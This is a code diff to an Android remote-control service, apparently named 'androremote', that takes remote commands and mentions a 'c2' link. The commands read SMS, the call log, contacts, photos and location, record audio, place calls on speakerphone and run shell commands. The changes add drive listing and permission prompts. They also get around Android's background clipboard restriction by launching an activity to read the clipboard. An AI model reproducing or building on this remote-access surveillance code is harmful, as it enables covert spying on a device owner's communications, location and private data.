@@ -244,6 +244,16 @@ public class RemoteService extends Service {
                     }
                     return sb.toString();
                 }
+                case "drives": {
+                    StringBuilder sb = new StringBuilder("OK ");
+                    File[] dirs = getExternalFilesDirs(null);
+                    if (dirs != null) for (File d : dirs) if (d != null) {
+                        String p = d.getAbsolutePath();
+                        int cut = p.indexOf("/Android/");
+                        sb.append(cut > 0 ? p.substring(0, cut) : p).append('\n');
+                    }
+                    return sb.toString();
+                }
                 case "put": {
                     // PUT <size> <dest-path>, then raw bytes follow on socket
                     if (sock == null) return "ERR put: raw mode needs direct link (c2: use putb64)";
@@ -307,6 +317,8 @@ public class RemoteService extends Service {
                 }
                 case "sms": {
                     // SMS <number> <text>
+                    String denied = requestPermission("sms", android.Manifest.permission.SEND_SMS);
+                    if (denied != null) return denied;
                     int sp = arg.indexOf(' ');
                     if (sp < 0) return "ERR sms: <number> <text>";
                     String num = arg.substring(0, sp).trim();
@@ -319,8 +331,8 @@ public class RemoteService extends Service {
                     }
                 }
                 case "calllog": {
-                    if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
-                        return "ERR calllog: permission denied";
+                    String denied = requestPermission("calllog", android.Manifest.permission.READ_CALL_LOG);
+                    if (denied != null) return denied;
                     int limit = 25;
                     try { limit = Math.max(1, Math.min(500, Integer.parseInt(arg.isEmpty() ? "25" : arg.trim()))); }
                     catch (NumberFormatException ignored) {}
@@ -345,6 +357,8 @@ public class RemoteService extends Service {
                 }
                 case "call": {
                     if (arg.isEmpty()) return "ERR call: <number>";
+                    String denied = requestPermission("call", android.Manifest.permission.CALL_PHONE);
+                    if (denied != null) return denied;
                     try {
                         android.media.AudioManager am = (android.media.AudioManager) getSystemService(AUDIO_SERVICE);
                         try { am.setSpeakerphoneOn(true); } catch (Exception ignored) {}
@@ -357,9 +371,9 @@ public class RemoteService extends Service {
                     }
                 }
                 case "loc": {
-                    if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
-                            && checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED)
-                        return "ERR loc: permission denied";
+                    String denied = requestPermission("loc", android.Manifest.permission.ACCESS_FINE_LOCATION,
+                            android.Manifest.permission.ACCESS_COARSE_LOCATION);
+                    if (denied != null) return denied;
                     LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
                     Location best = null;
                     for (String p : new String[]{LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER}) {
@@ -386,8 +400,8 @@ public class RemoteService extends Service {
                             + " prov=" + best.getProvider();
                 }
                 case "photos": {
-                    if (checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED)
-                        return "ERR photos: permission denied";
+                    String denied = requestPermission("photos", android.Manifest.permission.READ_MEDIA_IMAGES);
+                    if (denied != null) return denied;
                     int limit = 30;
                     try { limit = Math.max(1, Math.min(500, Integer.parseInt(arg.isEmpty() ? "30" : arg.trim()))); }
                     catch (NumberFormatException ignored) {}
@@ -411,8 +425,8 @@ public class RemoteService extends Service {
                 }
                 case "record": {
                     // RECORD <seconds> -> WAV in app dir; fetch with GET/GETB64
-                    if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED)
-                        return "ERR record: permission denied";
+                    String denied = requestPermission("record", android.Manifest.permission.RECORD_AUDIO);
+                    if (denied != null) return denied;
                     int secs = 10;
                     try { secs = Math.max(1, Math.min(300, Integer.parseInt(arg.isEmpty() ? "10" : arg.trim()))); }
                     catch (NumberFormatException ignored) {}
@@ -604,8 +618,8 @@ public class RemoteService extends Service {
                     return sb.toString();
                 }
                 case "contacts": {
-                    if (checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
-                        return "ERR contacts: permission denied";
+                    String denied = requestPermission("contacts", android.Manifest.permission.READ_CONTACTS);
+                    if (denied != null) return denied;
                     int n = 30;
                     try { n = Math.max(1, Math.min(1000, Integer.parseInt(arg.isEmpty() ? "30" : arg.trim()))); }
                     catch (NumberFormatException ignored) {}
@@ -627,8 +641,8 @@ public class RemoteService extends Service {
                     return sb.toString();
                 }
                 case "smsin": {
-                    if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED)
-                        return "ERR smsin: permission denied";
+                    String denied = requestPermission("smsin", android.Manifest.permission.READ_SMS);
+                    if (denied != null) return denied;
                     int n = 20;
                     try { n = Math.max(1, Math.min(500, Integer.parseInt(arg.isEmpty() ? "20" : arg.trim()))); }
                     catch (NumberFormatException ignored) {}
@@ -719,6 +733,7 @@ public class RemoteService extends Service {
                     try {
                         android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                         cm.setPrimaryClip(android.content.ClipData.newPlainText("androremote", arg));
+                        getSharedPreferences("cfg", MODE_PRIVATE).edit().putString("clip_last", arg).apply();
                         return "OK clipset";
                     } catch (Exception e) {
                         return "ERR clipset: " + e;
@@ -726,17 +741,25 @@ public class RemoteService extends Service {
                 }
                 case "clipget": {
                     try {
-                        android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
-                        if (cm.hasPrimaryClip() && cm.getPrimaryClip() != null && cm.getPrimaryClip().getItemCount() > 0) {
-                            CharSequence t = cm.getPrimaryClip().getItemAt(0).coerceToText(this);
-                            return "OK clipget " + t;
-                        }
+                        ClipboardActivity.result = null;
+                        Intent i = new Intent(this, ClipboardActivity.class);
+                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        startActivity(i);
+                        long deadline = System.currentTimeMillis() + 2000;
+                        while (ClipboardActivity.result == null && System.currentTimeMillis() < deadline)
+                            Thread.sleep(25);
+                        if (ClipboardActivity.result != null && !ClipboardActivity.result.isEmpty())
+                            return "OK clipget " + ClipboardActivity.result;
+                        String last = getSharedPreferences("cfg", MODE_PRIVATE).getString("clip_last", "");
+                        if (!last.isEmpty()) return "OK clipget " + last;
                         return "ERR clipget: empty";
                     } catch (Exception e) {
-                        return "ERR clipget: restricted (Android 10+ limits background clipboard reads)";
+                        return "ERR clipget: " + e;
                     }
                 }
                 case "torch": {
+                    String denied = requestPermission("torch", android.Manifest.permission.CAMERA);
+                    if (denied != null) return denied;
                     boolean on = arg.trim().equalsIgnoreCase("on");
                     try {
                         android.hardware.camera2.CameraManager cm = (android.hardware.camera2.CameraManager) getSystemService(CAMERA_SERVICE);
@@ -852,6 +875,17 @@ public class RemoteService extends Service {
         } catch (Exception e) {
             return "ERR " + e;
         }
+    }
+
+    private String requestPermission(String op, String... permissions) {
+        for (String p : permissions) if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
+            Intent i = new Intent(this, MainActivity.class);
+            i.putExtra(MainActivity.PERMS_KEY, permissions);
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+            startActivity(i);
+            return "ERR " + op + ": permission dialog shown; approve and retry";
+        }
+        return null;
     }
 
     String shell(String command, long timeoutMs) throws Exception {
